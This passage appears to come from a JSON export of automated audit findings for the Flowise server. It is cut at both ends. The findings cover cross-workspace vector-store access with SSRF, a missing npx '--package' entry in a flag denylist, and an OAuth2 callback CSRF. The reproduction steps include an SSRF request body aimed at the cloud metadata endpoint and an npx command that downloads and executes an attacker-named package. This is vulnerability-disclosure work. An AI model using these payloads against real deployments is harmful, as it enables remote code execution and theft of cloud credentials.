in sibling code confirming the oversight.\nSeverity-Original: HIGH\nPoC-Status: pending\nPre-FP-Flag: none\nDebate: archon/chamber-workspace/chamber-03/debate.md\n\n## Summary\n\nThe `queryVectorStore` endpoint in the DocumentStore controller allows any authenticated user to query vector stores belonging to other workspaces by supplying an arbitrary `storeId`. Additionally, the attacker-controlled `inputs` object is spread-merged into the vector store configuration, enabling SSRF by overriding host URLs (e.g., pointing to `http://169.254.169.254/` for cloud metadata exfiltration).\n\n## Location\n\n- Controller: `packages/server/src/controllers/documentstore/index.ts:497-508` -- no workspaceId extraction\n- Service: `packages/server/src/services/documentstore/index.ts:1472-1520` -- `DocumentStore.findOneBy({ id: data.storeId })` with no workspaceId filter\n- Config merge: `data.vectorStoreConfig = { ...vsConfig.config, ...data.inputs }` -- attacker inputs override vector store config\n\n## Attacker Control\n\n1. `storeId` -- attacker provides any DocumentStore UUID, bypassing workspace boundary\n2. `inputs` -- attacker provides arbitrary key-value pairs that override vector store connection config (e.g., `qdrantServerUrl`, `pineconeApiKey`, `chromaURL`)\n3. `query` -- attacker provides the search query to execute against the victim's vector store\n\n## Trust Boundary Crossed\n\nWorkspace A authenticated user accesses Workspace B document store data. SSRF component crosses from application server to internal network (cloud metadata, internal services).\n\n## Impact\n\n- **Cross-workspace data read**: Attacker retrieves vector store search results from any workspace's document store\n- **SSRF**: Attacker directs the server to make outbound connections to arbitrary URLs by overriding vector store host configuration, enabling cloud metadata theft (AWS/GCP/Azure instance credentials), internal service scanning, and data exfiltration via DNS\n\n## Evidence\n\n```typescript\n// controllers/documentstore/index.ts:497-508\nconst queryVectorStore = async (req: Request, res: Response, next: NextFunction) =\u003e {\n    // No workspaceId extraction from req.user\n    const body = req.body\n    const apiResponse = await documentStoreService.queryVectorStore(body)\n    return res.json(apiResponse)\n}\n\n// services/documentstore/index.ts:1477 -- no workspaceId filter\nconst entity = await appServer.AppDataSource.getRepository(DocumentStore).findOneBy({\n    id: data.storeId   // no workspaceId constraint\n})\n\n// Config merge allowing SSRF\ndata.vectorStoreConfig = { ...vsConfig.config, ...data.inputs }\n```\n\nSibling endpoint `getDocumentStoreById` at line 181-182 correctly queries with `{ id: storeId, workspaceId }`, confirming the omission is an oversight.\n\n## Reproduction Steps\n\n1. Authenticate as User A in Workspace A\n2. Obtain a DocumentStore UUID from Workspace B (discoverable via H-00e public chatbot config IDOR or enumeration)\n3. POST to `/api/v1/document-store/query` with body:\n   ```json\n   {\n     \"storeId\": \"\u003cworkspace-B-store-uuid\u003e\",\n     \"query\": \"confidential data\",\n     \"inputs\": {\n       \"qdrantServerUrl\": \"http://169.254.169.254/latest/meta-data/\"\n     }\n   }\n   ```\n4. Observe: (a) query results from Workspace B's vector store returned in response, (b) outbound connection made to the attacker-specified URL\n","severity":"high","confidence":"tentative","tags":["archon","phase-lite"],"status":"open","cvss_score":0,"repo_name":"flowiseai/flowise","finding_hash":"f4c133bb615e5eba6bc35814d6596d38","found_at":"2026-04-13T13:12:09.67675Z","created_at":"2026-04-13T13:12:09Z"}},{"type":"finding","data":{"id":346,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"2fa53224-e918-406e-999d-ee1fc63fa7e1","module_id":"archon:h7","module_name":"","module_type":"whitebox","finding_source":"archon","module_short":"npx-package-flag-bypass","description":"Phase: 8\nSequence: 021\nSlug: npx-package-flag-bypass\nVerdict: VALID\nRationale: The npx flag denylist explicitly blocks related dangerous flags but omits --package and -p, enabling arbitrary npm package installation and execution on the host OS by an authenticated flow editor, with no other validation layer blocking the attack.\nSeverity-Original: HIGH\nPoC-Status: pending\nPre-FP-Flag: none\nDebate: archon/chamber-workspace/chamber-02/debate.md\n\n## Summary\n\nThe MCP server command flag validation (`validateCommandFlags` in core.ts) maintains an explicit denylist for npx flags that enable code execution (`-c`, `--call`, `-y`, `--yes`, `--shell-auto-fallback`, `--node-options`). However, the denylist omits `--package` and its short alias `-p`, which instruct npx to install and execute an arbitrary npm package. An authenticated flow editor can configure a CustomMCP tool with `{ command: \"npx\", args: [\"--package\", \"attacker-evil-pkg\", \"evil-binary\"] }`, causing the server to download and execute an attacker-controlled npm package on the host OS.\n\n## Location\n\n- `packages/components/nodes/tools/MCP/core.ts:292-300` -- npx denylist in `validateCommandFlags`\n- `packages/components/nodes/tools/MCP/CustomMCP/CustomMCP.ts:176-182` -- validation gate\n\n## Attacker Control\n\nThe attacker controls the MCP server configuration (command and args) via the flow editor UI. The `--package` flag accepts an arbitrary npm package name, and npx will auto-install it from the npm registry and execute the specified binary.\n\n## Trust Boundary Crossed\n\nAuthenticated flow editor configuration -\u003e npm package download and execution on host OS. The trust boundary is between the application-level flow configuration and host OS process execution.\n\n## Impact\n\n- Arbitrary code execution on the host OS as the Node.js process user\n- npm package can contain any executable code (post-install scripts, binaries)\n- In default Docker deployment: root-level access\n- Supply chain attack vector: attacker publishes malicious package to npm registry\n\n## Evidence\n\n1. npx denylist is missing --package and -p:\n   ```typescript\n   // core.ts:292-300\n   npx: [\n       '-c',\n       '--call',\n       '--shell-auto-fallback',\n       '-y',\n       '--yes',\n       '--node-options'\n   ]\n   // Note: --package and -p are NOT listed\n   ```\n\n2. Spec Gap 10 independently identified this as CRITICAL.\n\n3. The `-p` flag for `node` command IS in the denylist (as `--print`), but for npx, `-p` is an alias for `--package` and has a completely different (dangerous) meaning.\n\n## Reproduction Steps\n\n1. As an authenticated flow editor, create a CustomMCP tool node.\n2. Set the MCP server configuration to:\n   ```json\n   {\n     \"command\": \"npx\",\n     \"args\": [\"--package\", \"attacker-evil-pkg\", \"evil-binary\"]\n   }\n   ```\n   where `attacker-evil-pkg` is a package on the npm registry containing a malicious binary named `evil-binary`.\n3. Add the CustomMCP tool to a chatflow and trigger a prediction request.\n4. The server will execute `npx --package attacker-evil-pkg evil-binary`, which downloads and executes the attacker's package.\n5. Verify by checking for artifacts created by the malicious package.\n","severity":"high","confidence":"tentative","tags":["archon","phase-lite"],"status":"open","cvss_score":0,"repo_name":"flowiseai/flowise","finding_hash":"ca6c5c80442c7a9b26803c1a5ce18421","found_at":"2026-04-13T13:12:09.676749Z","created_at":"2026-04-13T13:12:09Z"}},{"type":"finding","data":{"id":344,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"2fa53224-e918-406e-999d-ee1fc63fa7e1","module_id":"archon:h4","module_name":"","module_type":"whitebox","finding_source":"archon","module_short":"oauth2-callback-csrf-credential-overwrite","description":"Phase: 8\nSequence: 007\nSlug: oauth2-callback-csrf-credential-overwrite\nVerdict: VALID\nRationale: Pre-auth OAuth2 callback uses credential UUID as state parameter without CSRF nonce, allowing credential data poisoning via attacker-controlled token response when UUID is known; the spread operator enables overwriting any credential field including clientSecret.\nSeverity-Original: HIGH\nPoC-Status: pending\nPre-FP-Flag: none\nDebate: archon/chamber-workspace/chamber-01/debate.md\n\n## Summary\n\nThe OAuth2 credential callback endpoint (`GET /api/v1/oauth2-credential/callback`) is pre-auth (whitelisted) and uses the raw credential UUID as the `state` parameter instead of a cryptographic CSRF nonce. An attacker who knows a credential UUID can craft an OAuth2 authorization code flow that redirects to this callback with the attacker's authorization code and the victim's credential UUID as the state. The callback exchanges the code at the credential's configured `tokenUrl`, and the token response data is merged into the credential via JavaScript spread operator (`{ ...decryptedData, ...tokenData }`), allowing any field in the credential to be overwritten by the attacker-controlled token response -- including `clientSecret`, `access_token`, and other sensitive configuration.\n\n## Location\n\n- **Callback endpoint**: `packages/server/src/routes/oauth2/index.ts:157-304` -- pre-auth GET handler\n- **State as credential ID**: `packages/server/src/routes/oauth2/index.ts:125` -- `state: credentialId`\n- **Credential lookup (no workspace scope)**: `packages/server/src/routes/oauth2/index.ts:183` -- `findOneBy({ id: state })`\n- **Spread overwrite**: `packages/server/src/route
